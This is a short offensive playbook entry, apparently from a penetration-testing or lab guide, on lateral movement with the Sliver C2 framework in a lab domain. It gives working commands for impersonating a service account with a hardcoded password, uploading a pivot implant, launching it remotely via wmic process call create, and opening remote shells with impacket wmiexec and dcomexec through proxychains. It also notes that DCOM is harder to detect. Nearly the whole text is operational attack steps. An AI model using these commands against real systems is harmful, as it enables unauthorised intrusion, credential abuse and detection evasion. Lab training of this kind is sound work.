# 15.17 Lateral Movement WMIC WMIExec DCOM

> Move laterally via `wmic process call create`, `wmiexec.py`, or `dcomexec.py` over Sliver's SOCKS5.

## Overview

WMIC process call create executes a remote binary via WMI with explicit credentials. Can be run via `execute -o wmic` from a Sliver session. Impacket's wmiexec.py and dcomexec.py offer semi-interactive shells through the SOCKS5 proxy tunnel.

## Steps

- Upload the pivot implant to the target via an impersonated make-token session.
- `rev2self` after upload to drop the token before running wmic.
- Run wmic via `execute -o wmic /node:<ip> /user:<user> /password:<pass> process call create <path>`.
- Alternatively run wmic directly from a PowerShell terminal on the pivot host.
- `proxychains impacket-wmiexec` provides a semi-interactive shell through the SOCKS proxy.
- `proxychains impacket-dcomexec -object MMC20` uses DCOM for lateral movement (harder to detect).

## Commands

### make-token and upload implant to SRV02

```text
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

### Upload wmic pivot implant

```text
sliver (http-beacon) > upload wmicpivot.exe
```

### Revert token

```text
sliver (http-beacon) > rev2self
```

### Execute wmic via session

```text
sliver (http-beacon) >  execute -o wmic /node:<TARGET> /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"
```

### WMIExec via proxychains

```bash
proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@<TARGET>
```

### DCOMExec via proxychains

```bash
proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@<TARGET>
```
